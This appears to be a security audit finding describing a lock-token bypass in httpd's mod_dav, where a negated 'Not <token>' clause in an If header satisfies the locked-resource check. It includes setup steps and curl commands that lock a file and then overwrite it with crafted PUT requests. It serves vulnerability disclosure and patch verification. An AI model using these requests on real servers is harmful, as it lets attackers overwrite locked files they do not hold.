# 027 — Negated lock token satisfies WebDAV submitted-token check

`dav_find_submitted_locktoken()` at `modules/dav/main/util.c:866` does not
inspect `state_list->condition`, so a `Not <locktoken>` assertion in a
non-applicable tagged `If` list satisfies the locked-resource validation
that should require a positive lock-token submission.

## Setup

Build httpd with mod_dav and mod_dav_fs:

```bash
./configure --prefix=$PWD/inst --enable-dav --enable-dav-fs
make -j && make install
mkdir -p /var/dav /var/dav-lock
chown -R www-data:www-data /var/dav /var/dav-lock
```

`httpd.conf` snippet:

```apache
LoadModule dav_module     modules/mod_dav.so
LoadModule dav_fs_module  modules/mod_dav_fs.so

DavLockDB /var/dav-lock/lockdb

<Directory "/var/dav">
    Dav On
    Require all granted
</Directory>

Alias /dav/ /var/dav/
```

Seed a target file:

```bash
echo original > /var/dav/locked.txt
chown www-data:www-data /var/dav/locked.txt
```

## Trigger

Step 1 — take a write lock and capture the opaquelocktoken (no auth, so
`lock->auth_user` is NULL and the bypass is purely about the `Not` shape):

```bash
TOKEN=$(curl -sD- -X LOCK http://127.0.0.1:8080/dav/locked.txt \
  -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?>
<D:lockinfo xmlns:D="DAV:">
  <D:lockscope><D:exclusive/></D:lockscope>
  <D:locktype><D:write/></D:locktype>
  <D:owner><D:href>mailto:a@b</D:href></D:owner>
</D:lockinfo>' \
  | sed -n 's/^Lock-Token: <\(.*\)>.*/\1/p' | tr -d '\r')
echo "token=$TOKEN"
```

Step 2 — issue a `PUT` whose `If` header carries no positive token for the
locked URI; only a `Not <token>` clause appears, on a non-applicable URL:

```bash
curl -v -X PUT http://127.0.0.1:8080/dav/locked.txt \
  --data 'overwritten by attacker' \
  -H "If: <http://127.0.0.1:8080/dav/locked.txt> (Not <$TOKEN>)"
```

A second variant proving the negated token of the *real* lock is accepted
in a non-applicable tagged list:

```bash
curl -v -X PUT http://127.0.0.1:8080/dav/locked.txt \
  --data 'overwritten by attacker' \
  -H "If: <http://127.0.0.1:8080/dav/elsewhere> (Not <$TOKEN>)"
```

## Observed effect

Unpatched: response is `204 No Content`. `cat /var/dav/locked.txt` shows the
file replaced by the attacker payload, even though no positive submission
of the lock token occurred.

Patched: response is `423 Locked` with body `lock token submitted is not
locked here` (or equivalent), and the file is unchanged.

## Notes

Combine with finding 028 for the multi-user variant where the `Not` clause
applies to the locked URI and a separate tagged list scoops in another
user's positive token via the fallback scan.
